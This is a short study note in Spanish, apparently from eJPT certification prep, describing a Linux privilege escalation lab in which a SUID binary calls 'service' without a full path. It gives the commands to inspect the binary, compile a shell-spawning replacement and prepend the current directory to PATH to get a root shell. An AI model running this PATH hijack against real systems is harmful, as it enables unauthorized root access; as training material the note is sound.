- El ejecutable /usr/local/bin/suid-env puede ser explotado debido a que hereda la variable de entorno PATH del usuario e intenta ejecutar programas sin especificar una ruta absoluta.

- First, execute the file and note that it seems to be trying to start the apache2 webserver:

```
/usr/local/bin/suid-env
```

- Ejecute cadenas en el archivo para buscar cadenas de caracteres imprimibles:

```
strings /usr/local/bin/suid-env
```

- Una línea ("service apache2 start") sugiere que se está llamando al ejecutable del servicio para iniciar el servidor web, sin embargo, no se está utilizando la ruta completa del ejecutable (/usr/sbin/service).

- Compile el código ubicado en /home/user/tools/suid/service.c en un ejecutable llamado servicio. Este código simplemente genera un shell Bash:

```
gcc -o service /home/user/tools/suid/service.c
```

- Anteponga el directorio actual (o donde se encuentra el nuevo ejecutable del servicio) a la variable PATH y ejecute el ejecutable suid-env para obtener un shell raíz:

```
PATH=.:$PATH /usr/local/bin/suid-env
```

enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables  Known - Exploits]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables - Shared Object Injection]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables - Abusing Shell Features (1)]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/SUID - SGID Executables - Abusing Shell Features (2)]]